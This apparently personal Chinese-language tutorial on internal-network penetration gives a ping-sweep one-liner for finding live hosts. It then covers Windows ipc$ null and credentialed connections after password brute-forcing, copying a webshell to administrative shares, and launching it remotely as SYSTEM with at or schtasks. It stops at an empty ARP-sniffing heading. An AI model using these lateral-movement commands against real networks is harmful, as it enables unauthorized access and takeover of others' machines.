# 内网渗透

### C段扫描/存活探测

C段指x.x.x.x中第三个x的位置，处于同一C段意味着是在同一内网环境下。在渗透时如果一台服务器不存在可以渗透的点，则可考虑渗透同一内网下的其他服务器，通过内网渗透目标服务器。

扫描目标C段的存活主机，用脚本扫。或是直接简单用ping命令即可:

`for /L %P in (1,1,254) do @ping -w 10 -n 1 192.168.1.%P | findstr TTL=`

实现方法多种多样不一一赘述。

### ipc$管道

ipc$管道是Windows内用于传输共享内容的功能

主要用于内网中共享内容的传输(主要是内网，当然存在公网连接的情况，不过极少)

需要对方的137，138，139，445端口开放，由于这些端口存在诸如'永恒之蓝'之类的病毒肆虐，所以国内服务商好像基本禁止了这个端口的服务...所以常用于内网渗透。

主要利用方式为爆破对方管理员用户名密码，拿到管理权限，利用ipc$共享管道向对方传输shell拿到对方计算机权限

建立空连接:

`net use \\192.168.1.11\ipc$ "" /user:""`

空连接的权限有限

使用用户名密码连接:(默认管理员用户名Administrator)

`net use \\192.168.1.11\ipc$ "密码" /user:"用户名" `

查看对方共享文件:

`net view \\192.168.1.11`

当然这个指令无法查看对方的默认共享，默认共享包括
admin$(C:/windows/system32)
c$(C:/)
d$(D:/)
.
.
一系列盘符。

查看远程计算机的时间:

`net time \\192.168.1.8`

将文件拷贝到远程计算机:

`copy 1.txt \\192.168.1.11\d$`

用该命令即可将webshell传至对方pc。但我这里执行失败了，显示拒绝访问

查询发现自windows7以后，远程连接用户的权限只能是guest，无论是不是使用的administrator账户

所以该方式仅适用于windows 2000/nt 的系统(- -限制太多，还是写完，有时间装个nt虚拟机试试)

远程执行任务:

`at \\192.168.1.11\ 时间 程序`

在window8以后at命令被schtasks命令代替了，也写一下schtasks的用法

`schtasks /Create /S 192.168.1.11 /U 用户名 /P "密码" /SC only /ST 时间 /tn 任务名 /tr c:\windows\temp\cmd.exe /ru system`

参数较多，大概格式为上述命令，安利这篇博客讲的十分清楚

http://www.voidcn.com/article/p-yiwkcuyb-bnm.html

at或者schtasks执行shell后就完成了

### arp嗅探
